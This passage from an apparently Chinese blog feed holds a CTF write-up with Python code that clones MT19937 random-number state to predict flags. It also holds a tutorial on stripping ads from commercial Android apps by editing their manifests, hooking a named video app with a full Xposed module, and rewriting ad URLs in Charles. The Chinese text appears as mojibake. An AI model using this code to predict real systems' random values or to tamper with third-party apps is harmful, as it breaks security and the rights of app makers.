res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invert_temper</span>(<span class="hljs-params">m</span>):<br>    m = invert_right(m,<span class="hljs-number">18</span>)<br>    m = invert_left(m,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)<br>    m = invert_left(m,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)<br>    m = invert_right(m,<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone_mt</span>(<span class="hljs-params">record</span>):<br>    state = [invert_temper(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> record]<br>    gen = Random()<br>    gen.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>    <span class="hljs-keyword">return</span> gen<br><br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;random.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br>prng = []<br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    i = i.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(i).bit_length())<br>    <span class="hljs-keyword">if</span>(j%<span class="hljs-number">3</span>==<span class="hljs-number">0</span>):<br>        prng.append(<span class="hljs-built_in">int</span>(i))<br>    <span class="hljs-keyword">elif</span>(j%<span class="hljs-number">3</span>==<span class="hljs-number">1</span>):<span class="hljs-comment">#å°†ç”Ÿæˆä¸¤æ¬¡éšæœºæ•°çš„ä¸¤ä¸ªéšæœºæ•°åˆ†ç¦»å‡ºæ¥</span><br>        prng.append(<span class="hljs-built_in">int</span>(i)&amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span> - <span class="hljs-number">1</span>))<br>        prng.append(<span class="hljs-built_in">int</span>(i)&gt;&gt; <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">else</span>:<span class="hljs-comment">#å°†ç”Ÿæˆä¸‰æ¬¡éšæœºæ•°çš„ä¸‰ä¸ªéšæœºæ•°åˆ†ç¦»å‡ºæ¥</span><br>        prng.append(<span class="hljs-built_in">int</span>(i)&amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">32</span> - <span class="hljs-number">1</span>))<br>        prng.append(<span class="hljs-built_in">int</span>(i)&amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">32</span>)<br>        prng.append(<span class="hljs-built_in">int</span>(i)&gt;&gt;<span class="hljs-number">64</span>)<br>    j+=<span class="hljs-number">1</span><br><br>g = clone_mt(prng[:<span class="hljs-number">624</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    g.getrandbits(<span class="hljs-number">32</span>)<span class="hljs-comment">#äº§ç”Ÿå‰624ä¸ªéšæœºæ•°ï¼Œè®©stateçŠ¶æ€åˆ°ç”Ÿæˆflagå‰</span><br><br>key = g.getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>flag = md5(<span class="hljs-built_in">str</span>(key).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#14c71fec812b754b2061a35a4f6d8421</span><br></code></pre></td></tr></table></figure><h2 id="2023HITCTFé‚€è¯·èµ›"><a href="#2023HITCTFé‚€è¯·èµ›" class="headerlink" title="2023HITCTFé‚€è¯·èµ›"></a>2023HITCTFé‚€è¯·èµ›</h2><p>æ•°æ®ï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/zip/35612767/1733714779876-6541bea6-2464-4673-b684-4b38e6fef9c1.zip">ğŸ“output.zip</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(random.randbytes(<span class="hljs-number">2500</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HITCTF2023&#123;%s&#125;&#x27;</span> % random.randbytes(<span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><p>é¢˜ç›®å·²çŸ¥äº§ç”Ÿäº†2500ä¸ªbyteï¼Œä¸€ä¸ªbyteæ˜¯8ä½ï¼Œä¹Ÿå°±æ˜¯è¯´4ä¸ªbyteç»„æˆä¸€ä¸ª32ä½éšæœºæ•°ï¼Œ2500&#x2F;4&#x3D;625&gt;624ï¼Œæ»¡è¶³é¢„æµ‹æ¡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor<br><br><span class="hljs-comment">#è¯»å–æ•°æ®ï¼Œå¹¶4ä¸ªä¸€ç»„ç»„æˆä¸€ä¸ª32ä½éšæœºæ•°(littleæ˜¯é‡ç‚¹)</span><br>c = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>c = [c[x:x+<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-number">4</span>)]<br>c = [<span class="hljs-built_in">int</span>.from_bytes(x, <span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c]<br><br>predictor = MT19937Predictor()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c[:<span class="hljs-number">624</span>]:<br>predictor.setrandbits(x, <span class="hljs-number">32</span>) <span class="hljs-comment">#åªéœ€è¦624ç»„æ•°æ®å°±è¡Œ</span><br><span class="hljs-keyword">assert</span> predictor.getrandbits(<span class="hljs-number">32</span>) == c[-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;HITCTF2023&#123;%s&#125;&#x27;</span> % predictor.randbytes(<span class="hljs-number">16</span>).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># HITCTF2023&#123;d6712c20657ce5e02118f8592b7da71f&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç»•è¿‡å¹¿å‘Šç®€å•æ€»ç»“</title>
    <link href="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <url>/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>æœ¬ç¯‡æ–‡ç« ä»…ç”¨äºæŠ€æœ¯äº¤æµå­¦ä¹ å’Œç ”ç©¶ï¼Œä½¿ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯ç”¨äºéæ³•ç›®çš„å’Œç ´ååæœè‡ªè´Ÿ</strong></p><p><a href="https://www.bilibili.com/video/BV1CtkbYvEX8/?spm_id_from=333.337.search-card.all.click&vd_source=186775fb5e833bc4f9e53e60b11c99aa">https://www.bilibili.com/video/BV1CtkbYvEX8/?spm_id_from=333.337.search-card.all.click&amp;vd_source=186775fb5e833bc4f9e53e60b11c99aa</a></p><p><a href="https://blog.csdn.net/2301_80124151/article/details/136779233">https://blog.csdn.net/2301_80124151/article/details/136779233</a></p><h1 id="ç”¨MTç®¡ç†å™¨-LibCheckerå»é™¤WiFié’¥åŒ™å¹¿å‘Š"><a href="#ç”¨MTç®¡ç†å™¨-LibCheckerå»é™¤WiFié’¥åŒ™å¹¿å‘Š" class="headerlink" title="ç”¨MTç®¡ç†å™¨+LibCheckerå»é™¤WiFié’¥åŒ™å¹¿å‘Š"></a>ç”¨MTç®¡ç†å™¨+LibCheckerå»é™¤WiFié’¥åŒ™å¹¿å‘Š</h1><p>ç›®æ ‡ï¼šç»•è¿‡åˆšç™»å½•åŠå…¶ä»–ç®€å•å¹¿å‘Š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078102934-f921a5cf-bdcb-41a8-830d-c993dcdb0e6c.jpeg" class="" title="img"><p>åœ¨æˆ‘çš„ç•Œé¢è¿˜æœ‰å¹¿å‘Š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078108493-509e9dae-f45f-4841-b7f4-3bd446a3d6c1-17519810602832.jpeg" class="" title="img"><p>MTç¼–è¾‘çš„æ—¶å€™ä¼šæœ‰æƒé™é—®é¢˜ï¼Œéœ€è¦æ”¾åˆ°storageæ–‡ä»¶å¤¹ä¸‹</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078199642-26d79292-c507-44b3-b8b1-6e1a06efe764-17519810602834.jpeg" class="" title="img"><h2 id="AndroidManifest"><a href="#AndroidManifest" class="headerlink" title="AndroidManifest"></a>AndroidManifest</h2><p>ä¸€å¼€å§‹å°è¯•ç”¨MTåç¼–è¯‘AndroidManifestï¼Œæœç´¢åˆ°äº†baiduå¹¿å‘Šä»£ç ï¼Œç›´æ¥å…¨éƒ¨åˆ é™¤</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078117202-1aeeca26-1dad-44c7-b2fc-7a7ddeae8bde.jpeg" class="" title="img"><h2 id="LibChecker"><a href="#LibChecker" class="headerlink" title="LibChecker"></a>LibChecker</h2><p>æ‰¾appçš„å¹¿å‘ŠæœåŠ¡ï¼Œæ‰¾åˆ°ç©¿å±±ç”²å¹¿å‘Š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078001347-f10f8baa-1532-4c79-902a-068a1aaa8767.jpeg" class="" title="img"><p>è¿˜æœ‰è…¾è®¯å¹¿å‘Š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078267030-948049e1-351c-4e0e-a5ac-5c4f60198069.jpeg" class="" title="img"><p>æœç´¢çˆ¶ç±»</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743077991851-5e0271a5-a086-414a-9d4b-8450d4b1ebcd-17519810602839.jpeg" class="" title="img"><p>æ›¿æ¢ä¸ºé€šé…ç¬¦#</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1743078130967-37fcae72-094c-41a1-bf9c-8dd9f6ab3c2c.jpeg" class="" title="img"><p>ä¹‹åç¼–è¯‘ä¿å­˜æ›´æ–°ï¼Œä¸€å’Œä¸‰ä¸¤ä¸ªå¹¿å‘Šå¹¶æ²¡æœ‰å»é™¤ï¼Œä½†æ˜¯å¹¿å‘ŠäºŒå·²ç»æ¶ˆå¤±äº†</p><h1 id="ç”¨Xposedå»é™¤-æœè§†é¢‘ç‰‡å¤´å¹¿å‘Š"><a href="#ç”¨Xposedå»é™¤-æœè§†é¢‘ç‰‡å¤´å¹¿å‘Š" class="headerlink" title="ç”¨Xposedå»é™¤*æœè§†é¢‘ç‰‡å¤´å¹¿å‘Š"></a>ç”¨Xposedå»é™¤*æœè§†é¢‘ç‰‡å¤´å¹¿å‘Š</h1><p>ç›®æ ‡ï¼šé’ˆå¯¹æœ€æ–°ç‰ˆæœ¬çš„*æœappï¼Œç”¨afterhookmethodä¿®æ”¹è¿”å›å€¼ï¼Œä½¿å¾—èƒ½ç›´æ¥ç»•è¿‡å¹¿å‘Š</p><p>å®‰è£…xposedæ¨¡å—</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880108809-aec77c07-5545-4234-a5d8-d6d7bc92277b.png" class="" title="img"><p>é…ç½®ä»£ç†</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880108988-2b31be3d-f957-49c2-8cdc-eb9aa90c1bfc.png" class="" title="img"><p>èƒ½æŠ“åˆ°æµé‡ä½†æ˜¯ç½‘ç»œä¸é€š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880109145-c0f1360a-465d-4153-b317-a8d3c53fe492.png" class="" title="img"><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880109356-9ed54d90-4035-48c9-9b56-f93c3faed759.png" class="" title="img"><p>é‡æ–°å®‰è£…æ ¹è¯ä¹¦</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751210589814-8799fddc-1fee-4cff-a0ac-7f1c79886584.png" class="" title="img"><p>å°è¯•å¤åˆ¶æƒé™</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880109793-dc0ba1fd-807c-47bd-9576-387cb0bde259.png" class="" title="img"><p>å‘ç°èƒ½å¤ŸæˆåŠŸè®¿é—®</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880110071-f42b0554-e291-48c5-a640-69b19794007d.png" class="" title="img"><p>ç”¨ASæ–°å»ºé¡¹ç›®</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880110362-441b58a4-1142-49ad-a42c-5dd1c20d20c4.png" class="" title="img"><p>Sdkç‰ˆæœ¬ä¸º25ä¸èƒ½ä½¿ç”¨anydpiï¼Œå› æ­¤ä¿®æ”¹AndroidManifest.xmlæ–‡ä»¶</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880110603-3ecf349d-b788-4f11-996a-74c87068a91c.png" class="" title="img"><p>ç›´æ¥åˆ é™¤mipmap-anydpiæ•´ä¸ªæ–‡ä»¶å¤¹</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880111405-33082d7e-f534-4aca-a955-a6f2dd01b37d.png" class="" title="img"><p>è‡ªå·±åˆ›å»ºlibsæ–‡ä»¶å¤¹å¹¶æŠŠä¸¤ä¸ªjaråŒ…æ”¾åˆ°ä¸‹é¢</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880112065-9e30a9e0-1a5e-4f19-ba26-2178d6110d51.png" class="" title="img"><p>ç”¨kotlinæ·»åŠ ä¾èµ–</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880112250-2ca0409b-a4c0-4ad7-9dfd-d91c4a9e5957.png" class="" title="img"><p>æ·»åŠ Xpoesdä»“åº“</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880112420-1ba39548-57c6-41b9-98db-fb94c14fdc96.png" class="" title="img"><p>æœ€åç¼–è¯‘çš„sdkç‰ˆæœ¬è¿˜æ˜¯35</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880112616-2e7ccb1f-c0b4-4727-bfe7-ba5c7950dc80.png" class="" title="img"><p>æ·»åŠ xposed.initæ–‡ä»¶</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880112855-0c1579cc-8917-41f3-ab8e-37ecb8641260.png" class="" title="img"><p>ä½†å…¶å®æ–‡æ¡£æœ‰é—®é¢˜</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880113041-6a56a802-86f8-4305-9512-a1f154801ce7.png" class="" title="img"><p>åº”è¯¥æ˜¯xposed_init</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880113230-0aae8acd-04c8-4daa-8e65-406e8cf7a3d7.png" class="" title="img"><p>ç›¸å½“äºå¯ä»¥è‡ªå·±ç¼–å†™æ¨¡å—äº†</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880113514-c36ffb32-bf03-4a16-8d6a-067e02c7812a.png" class="" title="img"><p>ä¹‹åé‡æ–°å¯åŠ¨ï¼ŒæŸ¥çœ‹æ—¥å¿—å‘ç°æœ‰æŠ¥é”™</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880113730-7a1a4462-db1f-4198-a569-13f59cbaf75e.png" class="" title="img"><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880114048-8bdeec87-5abc-4528-98a6-c78044dda290.png" class="" title="img"><p>å¿…é¡»è®¾ç½®ä¸º25</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880114293-96c7467b-df89-45bd-8cf9-b250451f4ed0.png" class="" title="img"><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880114599-a27d294b-f7a3-4a6a-9113-385bb974a446.png" class="" title="img"><p>è¾“å…¥1å’Œ1å°±èƒ½æˆåŠŸç™»å…¥</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880114825-3e08cc17-1046-4d91-a212-fc7e09228f58.png" class="" title="img"><ol><li>ç”¨AndroidKilleræ‰¾åˆ°å…³é”®ä»£ç </li></ol><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880115023-5c60f57e-9622-435a-bb51-06bbc1e43086.png" class="" title="img">ç»•è¿‡å¹¿å‘Šçš„é…ç½®åŒç†<img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880115245-e3593f4d-a71c-44fc-b6ed-abb0913bb2ba.png" class="" title="img"><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880115434-b427e9ef-1e49-470e-9d7d-72bad4f3e384.png" class="" title="img"><p>ç¬¬ä¸€éƒ¨åˆ†ä¸»è¦å®ç°æŠŠæœåŠ¡å™¨åœ°å€æ”¹æˆæœ¬åœ°å›ç¯åœ°å€åŠ ç«¯å£ï¼Œç¬¬äºŒéƒ¨åˆ†ä¿®æ”¹è¿”å›åœ°å€ï¼Œè¿™æ ·æ›´åŠ ä¿é™©</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.adskip;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;<span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook;<span class="hljs-keyword">import</span> de.robv.android.xposed.XposedBridge;<span class="hljs-keyword">import</span> de.robv.android.xposed.XposedHelpers;<span class="hljs-keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdSkip</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IXposedHookLoadPackage</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span> (!lpparam.packageName.equals(<span class="hljs-string">&quot;com.hunantv.imgo.activity&quot;</span>))&#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;ä¸æ˜¯*æœTVåº”ç”¨ï¼Œç›´æ¥è·³è¿‡&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        XposedBridge.log(<span class="hljs-string">&quot;æ‰¾åˆ°*æœTVï¼Œå¼€å§‹hook&quot;</span>);<br><br>        XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;mk.b&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                <span class="hljs-built_in">super</span>.afterHookedMethod(param);<br>                XposedBridge.log(<span class="hljs-string">&quot;Mæ–¹æ³•å·²ç»æ‰§è¡Œå®Œæ¯•&quot;</span>);<br>                <span class="hljs-comment">//è·å–å®ä¾‹å¯¹è±¡</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> param.thisObject;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">fList</span> <span class="hljs-operator">=</span> XposedHelpers.getObjectField(instance, <span class="hljs-string">&quot;f&quot;</span>);<br>                <span class="hljs-keyword">if</span> (fList <span class="hljs-keyword">instanceof</span> java.util.List)&#123;<br>                    ((java.util.List)fList).clear();<br>                    XposedBridge.log(<span class="hljs-string">&quot;fListå·²ç»æ¸…ç©º&quot;</span>);<br>                    ((java.util.List)fList).add(<span class="hljs-string">&quot;http://127.0.0.1:6667&quot;</span>);<br>                    XposedBridge.log(<span class="hljs-string">&quot;mobile2.da.mgtv.comå·²ç»ä¿®æ”¹ä¸ºhttp://127.0.0.1:6667&quot;</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    XposedBridge.log(<span class="hljs-string">&quot;fListä¸æ˜¯Listç±»å‹&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;mk.b&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XC_MethodHook</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                <span class="hljs-built_in">super</span>.afterHookedMethod(param);<br>                param.setResult(<span class="hljs-string">&quot;http://127.0.0.1:6666&quot;</span>);<br>                XposedBridge.log(<span class="hljs-string">&quot;mobile.da.mgtv.comå·²ç»ä¿®æ”¹ä¸ºhttp://127.0.0.1:6666&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1748880115687-0b5a69cc-50ba-400d-a8d3-4a7b9d392376.png" class="" title="img"><h1 id="ç”¨charleså»é™¤-è®¯è§†é¢‘ç‰‡å¤´å¹¿å‘Š"><a href="#ç”¨charleså»é™¤-è®¯è§†é¢‘ç‰‡å¤´å¹¿å‘Š" class="headerlink" title="ç”¨charleså»é™¤*è®¯è§†é¢‘ç‰‡å¤´å¹¿å‘Š"></a>ç”¨charleså»é™¤*è®¯è§†é¢‘ç‰‡å¤´å¹¿å‘Š</h1><p>ç›®æ ‡ï¼šç»•è¿‡æœ€æ–°ç‰ˆ*è®¯è§†é¢‘å¹¿å‘Šï¼Œå®ç°æ— å¹¿å‘Šæ’­æ”¾è§†é¢‘</p><p>é¦–å…ˆä¸‹è½½æœ€æ–°ç‰ˆ*è®¯è§†é¢‘ï¼ŒæŒ‰ç…§ä¹‹å‰çš„æ€è·¯ï¼Œå…ˆå»æŸ¥æ‰¾.mp4ï¼Œå‘ç°æŠŠç›¸å…³url rewriteä¹‹åè¿˜æ˜¯æœ‰å¹¿å‘Š</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211001821-e1dcf948-fd22-4c58-a5f2-99b2046ff4f6.png" class="" title="img"><p>è§‚å¯Ÿæ¯ä¸€ä¸ªå¹¿å‘Šéƒ½ä¼šæœ‰ä¸åŒçš„åŸŸåé—ªäº®ï¼Œéƒ½æ˜¯å’Œqq.comç›¸å…³çš„</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211039036-a888584c-e2ef-4908-b91b-b3c91e511b33.png" class="" title="img"><p>æ­£å¸¸è§†é¢‘æ’­æ”¾ä¹Ÿæœ‰å’Œqq.comç›¸å…³çš„urlä¼šäº®</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211064471-f6f73de0-c512-4140-9d85-ade2b1b742d8.png" class="" title="img">é‚£å°±çŒœæµ‹å¹¿å‘Šå’Œè§†é¢‘ç›¸å…³çš„urléƒ½å’Œqq.comæœ‰å…³ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„è§†é¢‘å¯¹åº”çš„urlä¸èƒ½è¿œç¨‹æ˜ å°„<p>æˆ‘å¤§æ¦‚æ‰¾äº†ä»¥ä¸‹ç½‘å€ï¼Œå…¨éƒ¨è¿œç¨‹æ˜ å°„ä¸ºè‡ªå®šä¹‰url</p><img src="/2025/06/29/%E7%BB%95%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1751211089402-a5156101-ed83-447a-87b9-3373df5852f3.png" class="" 